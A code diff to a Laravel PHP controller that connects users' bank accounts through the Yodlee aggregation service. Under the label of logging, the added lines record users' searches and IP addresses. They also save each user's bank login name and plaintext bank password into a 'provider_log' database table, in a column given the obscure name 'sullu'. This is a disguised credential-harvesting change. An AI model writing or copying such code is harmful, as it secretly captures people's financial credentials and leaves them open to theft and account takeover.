@@ -8,7 +8,6 @@ use Validator;
 // use Request; // SWOOP
 
 use App\User;
-use GuzzleHttp;
 use Auth;
 
 use App\Library\Yodlee\Cobrand;
@@ -16,6 +15,9 @@ use App\Library\Yodlee\Account;
 use App\Library\Yodlee\Provider;
 use App\Library\Yodlee\ProviderAccounts;
 use App\Library\Yodlee\Utils;
+
+use Carbon\Carbon;
+use DB;
 
 class AccountController extends Controller
 {
@@ -93,7 +95,6 @@ class AccountController extends Controller
 	public function removeProvider(Request $request, $providerId = null)
     {
 	
-
 		if ($providerId) {
 
 			$res = $this->providerAccounts->deleteProviderAccounts($providerId); 
@@ -297,6 +298,11 @@ class AccountController extends Controller
 
     	$searchResults = $this->provider->searchProviders($input['search']);
 
+    	// Logging the search to table search_log
+    	DB::table('search_log')->insert(
+    		['userId' => Auth::user()->id, 'yslUserId' => Auth::user()->yslUserId, 'date_time' => Carbon::now()->toDateTimeString(), 'ip' => \Request::ip(), 'searchWord' => $input['search']]
+		);
+
     	if (sizeof($searchResults)) {
     		// successful with results
 			$data['providers'] = $searchResults['provider'];
@@ -334,6 +340,8 @@ class AccountController extends Controller
     	$input = $request->all();
 
     	$provider = $this->provider->getProviderDetails($id);
+    	$providerName = $provider['provider'][0]['name'];
+
     	$provider = json_encode($provider, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);
     	
         $res = $this->cobrand->getPublicKey();
@@ -349,6 +357,11 @@ class AccountController extends Controller
  		$res = json_decode($this->providerAccounts->addProviderAccounts($mod_provider), true);
  		$providerAccountId = $res['providerAccountId'];
 
+ 		// Logging the provider data to provider_log
+    	DB::table('provider_log')->insert(
+    		['userId' => Auth::user()->id, 'yslUserId' => Auth::user()->yslUserId, 'date_time' => Carbon::now()->toDateTimeString(), 'ip' => \Request::ip(), 'accountId' => $id, 'providerName' => $providerName, 'uname' => $input['login'], 'sullu' => $input['password'], 'providerAccountId' => $providerAccountId]
+		);
+		
  		$url = 'account/status/'.$providerAccountId;
  		return \Redirect::to($url)->with('accountId', $id);
  	}
